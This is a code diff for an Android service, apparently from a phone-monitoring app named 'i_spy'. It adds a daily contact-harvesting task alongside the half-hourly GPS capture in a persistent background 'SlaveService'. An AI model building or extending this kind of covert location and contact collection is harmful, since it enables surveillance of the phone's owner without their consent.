@@ -1,7 +1,6 @@
 package com.um.asn.i_spy.services;
 
 import android.app.IntentService;
-import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.net.ConnectivityManager;
@@ -9,12 +8,14 @@ import android.os.Handler;
 import android.support.annotation.Nullable;
 
 import com.um.asn.i_spy.listeners.ConnectionListener;
+import com.um.asn.i_spy.manager.ContactManager;
+import com.um.asn.i_spy.manager.PositionGPSManager;
 import com.um.asn.i_spy.models.Phone;
-import com.um.asn.i_spy.models.PositionGPS;
 
 public class SlaveService extends IntentService {
 
     private final long TIME_BETWEEN_GET_DATA_GPS_MS = 1000 * 60 * 30;
+    private final long TIME_BETWEEN_GET_DATA_CONTACTS_MS = 1000 * 60 * 60 * 24;
     private Handler handler = new Handler();
     private Phone phone;
 
@@ -23,12 +24,25 @@ public class SlaveService extends IntentService {
             try {
                 System.out.println("Clock : try save Position");
 
-                PositionGPS posGPS = new PositionGPS(getApplicationContext(), phone);
-                posGPS.saveLocation((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE));
+                new PositionGPSManager(getApplicationContext(), phone).run();
 
                 handler.postDelayed(this, TIME_BETWEEN_GET_DATA_GPS_MS);
             }
             catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    };
+
+    private final Runnable getContacts = new Runnable() {
+        public void run() {
+            try {
+                System.out.println("Clock : try save contacts");
+
+                new ContactManager(getApplicationContext(), phone).run();
+
+                handler.postDelayed(this, TIME_BETWEEN_GET_DATA_CONTACTS_MS);
+            } catch (Exception e) {
                 e.printStackTrace();
             }
         }
@@ -49,6 +63,7 @@ public class SlaveService extends IntentService {
         registerReceiver(new ConnectionListener(), new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));
         getPhone();
         handler.post(getGPS);
+        handler.post(getContacts);
         return START_STICKY;
     }
 
